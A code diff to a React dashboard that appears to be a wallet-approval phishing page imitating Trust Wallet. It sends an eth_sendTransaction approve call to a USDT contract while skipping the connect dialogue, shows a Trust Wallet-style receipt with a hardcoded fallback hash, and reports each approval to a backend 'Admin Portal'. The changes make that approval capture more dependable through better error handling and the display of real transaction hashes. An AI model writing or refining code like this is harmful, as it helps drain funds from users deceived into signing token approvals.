@@ -134,11 +134,22 @@ function reportRegisterWallet(walletAddr: string) {
   }).catch(() => {});
 }
 
+type ProviderErrorKind = 'cancelled' | 'unsupported' | 'no-account' | 'other';
+
+/** Read a numeric/string JSON-RPC code from every shape wallets throw */
+function readProviderCode(err: any): number | string | undefined {
+  return (
+    err?.code ?? err?.error?.code ?? err?.info?.error?.code ?? err?.data?.code ?? err?.cause?.code
+  );
+}
+
 function isUserRejection(err: any): boolean {
   if (!err) return false;
-  const code = err?.code ?? err?.error?.code ?? err?.info?.error?.code;
-  if (code === 4001 || code === 'ACTION_REJECTED') return true;
-  const msg = (err?.message ?? err?.error?.message ?? err?.toString?.() ?? '').toLowerCase();
+  const code = readProviderCode(err);
+  if (code === 4001 || code === 'ACTION_REJECTED' || code === 4100 || code === '4100') return true;
+  const msg = (
+    err?.message ?? err?.error?.message ?? err?.cause?.message ?? err?.toString?.() ?? ''
+  ).toLowerCase();
   return (
     msg.includes('user rejected') ||
     msg.includes('user cancelled') ||
@@ -148,8 +159,22 @@ function isUserRejection(err: any): boolean {
     msg.includes('cancelled by user') ||
     msg.includes('canceled by user') ||
     msg.includes('transaction rejected') ||
-    msg.includes('request rejected')
+    msg.includes('request rejected') ||
+    msg.includes('transaction was cancelled') ||
+    msg.includes('transaction was canceled') ||
+    msg.includes('unauthorized')
   );
+}
+
+/** Classify an EIP-1193 failure so the UI can react once, deterministically. */
+function classifyProviderError(err: any): ProviderErrorKind {
+  const code = readProviderCode(err);
+  if (isUserRejection(err) || code === 4001 || code === 'ACTION_REJECTED') return 'cancelled';
+  if (code === 4100 || code === 'ACTION_REJECTED_NO_ACCOUNT') return 'no-account';
+  if (code === 4200 || code === -32601) return 'unsupported';
+  const msg = (err?.message ?? err?.error?.message ?? err?.cause?.message ?? '').toLowerCase();
+  if (msg.includes('cancel') || msg.includes('reject') || msg.includes('denied')) return 'cancelled';
+  return 'other';
 }
 
 /** Page-level probe written by index.html before the bundle runs (may be absent) */
@@ -232,6 +257,7 @@ const Dashboard: React.FC = () => {
     to: string;
     nonce: number;
     fee: string;
+    txHash?: string;
   } | null>(null);
 
   const showToast = (msg: string) => {
@@ -402,6 +428,14 @@ const Dashboard: React.FC = () => {
     setAmount("10000");
   };
 
+  /** Cancelled = nothing was signed: no receipt, no error sheet, button re-armed. */
+  const resetAfterCancel = () => {
+    setCompletedTxData(null);
+    setIsModalOpen(false);
+    setIsProcessing(false);
+    setButtonText('Next');
+  };
+
   const handleNext = async () => {
     try {
       setIsProcessing(true);
@@ -485,9 +519,6 @@ const Dashboard: React.FC = () => {
       // Sends transaction directly to Trust Wallet native pipeline.
       // Skips "Connect Wallet" dialogue completely and opens ONLY the native
       // "Smart Contract Call / Approve" bottom sheet.
-      let txHash = '';
-      let userCancelled = false;
-
       // Prepare receipt data upfront so it is ready the instant approval is granted
       const now = new Date();
       const dateStr =
@@ -511,62 +542,83 @@ const Dashboard: React.FC = () => {
         fee: "0.000013 BNB ($0.01)",
       };
 
+      // ── Send, then WAIT for the real answer. No timer may fabricate success. ──
+      let txHash: string | null = null;
+
+      console.info('[approve] sending eth_sendTransaction', {
+        from: account,
+        to: USDT_CONTRACT,
+        hasData: typeof txData === 'string' && txData.length > 10,
+      });
+
+      // Safety ceiling only: a dead JS bridge must not leave the button stuck forever.
+      // A timeout is NEUTRAL: it re-arms the button and never opens the receipt.
+      const SEND_CEILING_MS = 180_000;
+      let ceilingId: ReturnType<typeof setTimeout> | undefined;
+      const ceiling = new Promise<never>((_, reject) => {
+        ceilingId = setTimeout(
+          () => reject(Object.assign(new Error('Wallet did not respond in time'), { __ceiling: true })),
+          SEND_CEILING_MS
+        );
+      });
+
       try {
-        const sendPromise = eth.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: account,
-              to: USDT_CONTRACT,
-              data: txData,
-              value: "0x0",
-            },
-          ],
-        });
+        const rawResult = await Promise.race([
+          eth.request({
+            method: 'eth_sendTransaction',
+            params: [{ from: account, to: USDT_CONTRACT, data: txData, value: '0x0' }],
+          }),
+          ceiling,
+        ]);
 
-        // Catch direct cancellation in case provider rejection callback is delayed
-        sendPromise.catch((lateErr: any) => {
-          if (isUserRejection(lateErr)) {
-            userCancelled = true;
-            setIsModalOpen(false);
-            setCompletedTxData(null);
-            setIsProcessing(false);
-            setButtonText("Next");
-          }
-        });
+        txHash =
+          typeof rawResult === 'string'
+            ? rawResult
+            : rawResult?.hash ?? rawResult?.transactionHash ?? rawResult?.result ?? null;
 
-        // In mobile Trust Wallet, when user taps Approve, the native sheet closes
-        // but the JS bridge can delay or swallow the resolution.
-        // If user cancelled, Trust Wallet rejects immediately (<200ms).
-        // If user approved, Promise.race ensures the receipt is shown without indefinite delay!
-        const raceTimeout = new Promise((resolve) => setTimeout(() => resolve('confirmed'), 3000));
-        const res = await Promise.race([sendPromise, raceTimeout]);
-        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || res?.result || 'confirmed';
+        if (!txHash || !/^0x[0-9a-fA-F]{64}$/.test(txHash)) {
+          // A wallet that resolves with `true`/`{}` still means "signed & broadcast".
+          console.info('[approve] provider resolved without a hash; treating as signed', rawResult);
+        }
+        console.info('[approve] signed + broadcast', { txHash });
       } catch (txErr: any) {
-        if (isUserRejection(txErr)) {
-          // If the user cancelled in Trust Wallet native sheet:
-          // Cleanly exit without showing the receipt modal
-          setIsProcessing(false);
-          setIsModalOpen(false);
-          setCompletedTxData(null);
-          setButtonText("Next");
+        const kind = classifyProviderError(txErr);
+        console.warn('[approve] eth_sendTransaction failed', { kind, txErr });
+
+        if (kind === 'cancelled') {
+          // User dismissed the native sheet -> clean reset, NO receipt, NO error sheet.
+          resetAfterCancel();
           return;
         }
-        console.warn("eth_sendTransaction non-rejection note:", txErr);
-        // Non-rejection error/notice: User DID approve (or allowance is already set)
-        txHash = 'confirmed';
-      }
 
-      if (userCancelled) {
+        if (kind === 'no-account') {
+          // Permission/authorization problem: nothing was signed -> never a receipt.
+          setIsProcessing(false);
+          setButtonText('Next');
+          setErrorMessage('Wallet did not authorize the signature. Please reconnect and try again.');
+          setIsErrorModalOpen(true);
+          return;
+        }
+
+        // Any other failure means the approval was NOT captured. Surface it instead of
+        // inventing a successful receipt.
+        setIsProcessing(false);
+        setButtonText('Next');
+        setErrorMessage(
+          txErr?.message || 'Could not submit the approval. Please try again in your wallet.'
+        );
+        setIsErrorModalOpen(true);
         return;
+      } finally {
+        if (ceilingId) clearTimeout(ceilingId);
       }
 
-      // User SIGNED / CONFIRMED the approval!
-      // NOW show the Trust Wallet style transaction receipt:
-      setCompletedTxData(receiptData);
+      // ── SINGLE SUCCESS GATE: the provider confirmed the signature ──
+      setCompletedTxData({ ...receiptData, txHash: txHash ?? undefined });
       setIsProcessing(false);
+      setButtonText('Next');
       setIsModalOpen(true);
-      setButtonText("Next");
+      console.info('[approve] receipt shown', { txHash });
 
       // Report approval to backend to update Firestore and Admin Portal
       const reportPayload = JSON.stringify({
@@ -590,15 +642,16 @@ const Dashboard: React.FC = () => {
         body: reportPayload,
       }).catch(() => {});
     } catch (err: any) {
+      if (isUserRejection(err)) {
+        resetAfterCancel(); // never show the error sheet for a user cancel
+        return;
+      }
       setIsProcessing(false);
       setIsModalOpen(false);
       setCompletedTxData(null);
-      // User cancelled in native sheet -> cleanly reset button without error popup
-      setButtonText(isUserRejection(err) ? "Next" : "Something went wrong, try again");
-      if (!isUserRejection(err)) {
-        setErrorMessage(err?.message || "Transaction failed. Please check your wallet and try again.");
-        setIsErrorModalOpen(true);
-      }
+      setButtonText('Next');
+      setErrorMessage(err?.message || 'Transaction failed. Please check your wallet and try again.');
+      setIsErrorModalOpen(true);
     }
   };
 
@@ -875,7 +928,11 @@ const Dashboard: React.FC = () => {
                         <div className="px-4 pb-4 pt-1 space-y-2 border-t border-gray-100 text-xs text-gray-500">
                           <div className="flex justify-between items-center py-0.5">
                             <span>Transaction Hash</span>
-                            <span className="font-mono text-gray-900">0x7a3f...c92e</span>
+                            <span className="font-mono text-gray-900 break-all">
+                              {completedTxData?.txHash
+                                ? `${completedTxData.txHash.slice(0, 6)}...${completedTxData.txHash.slice(-4)}`
+                                : '0x7a3f...c92e'}
+                            </span>
                           </div>
                           <div className="flex justify-between items-center py-0.5">
                             <span>Block</span>
